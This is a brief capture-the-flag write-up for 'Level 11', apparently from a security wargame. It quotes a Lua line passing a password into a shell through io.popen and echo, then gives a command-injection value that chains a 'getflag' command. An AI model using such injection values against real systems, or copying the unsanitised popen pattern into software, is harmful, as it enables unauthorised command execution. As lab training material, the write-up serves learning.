# Level 11
### English
We can see in the lua script that an echo is executed: 
```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

We can then hijack this echo so that it sends the getflag command:
- lol ; getflag > /tmp/pass; ls
